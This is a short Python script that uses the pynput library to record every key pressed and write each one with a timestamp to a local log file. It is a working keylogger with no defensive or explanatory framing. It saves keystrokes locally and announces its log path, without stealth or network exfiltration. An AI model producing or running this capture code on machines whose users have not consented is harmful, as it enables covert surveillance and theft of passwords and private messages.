from pynput import keyboard
import logging
from datetime import datetime

# Set up logging configuration
log_file = f"key_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Function to log key presses
def on_press(key):
    try:
        logging.info(f'Key pressed: {key.char}')
    except AttributeError:
        logging.info(f'Special key pressed: {key}')

# Start listening
with keyboard.Listener(on_press=on_press) as listener:
    print(f"[INFO] Logging keys to: {log_file}")
    listener.join()
